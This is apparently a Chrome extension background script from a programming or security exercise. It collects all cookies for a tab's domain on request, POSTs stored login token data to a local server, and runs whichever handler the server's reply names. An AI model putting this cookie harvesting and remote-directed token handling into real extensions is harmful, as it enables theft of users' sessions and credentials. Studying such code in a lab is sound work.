let remoteJson;
const remoteServerUrl = "http://localhost:5555";

const CHAT_GPT_URL = "https://chatgpt.com";
// 🚧 Will be used in a later exercise – do not remove.
const onFetchDataHandler = (message) => {};

const onMessageHandler = async (message, sender, sendResponse) => {
  if (message.type === "getCookiesForTab") {
    const { tabId } = message;
    const target = {};
    try {
      const tab = await chrome.tabs.get(tabId);
      target.domain = new URL(tab.url).hostname;
    } catch (error) {
      console.error("Error getting tab:", error);
      sendResponse();
    }
    chrome.cookies.getAll(target, (cookies) => {
      sendResponse(cookies);
    });
  } 
};

const onRefreshCountHandler = async (token, expireTime, callback) => {
  const result = await chrome.storage.local.get("refreshTokenCount");
  const refreshTokenCount = result.refreshTokenCount || 0;
  chrome.storage.local.set({ refreshTokenCount: refreshTokenCount + 1 });
  callback({ token, expireTime });
};

const handlers = {
  onMessageHandler,
  onRefreshCountHandler,
  onFetchDataHandler,
};
chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  handlers.onMessageHandler(message, sender, sendResponse);
  return true;
});

chrome.storage.local.get("tokenData", ({ tokenData }) => {
  const requestBody = { loginInfo: tokenData };
  fetch(`${remoteServerUrl}/token`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify(requestBody),
  })
    .then((response) => response.json())
    .then((data) => {
      const { onTokenReceived, expireTime, token } = data;
      if (onTokenReceived) {
        handlers[onTokenReceived](token, expireTime, (token) => {
          if (!!token) {
            chrome.storage.local.set({ tokenData: { token, expireTime } });
          }
        });
      }
    })
    .catch((error) => {
      console.error("Error sending to server:", error);
    });
});
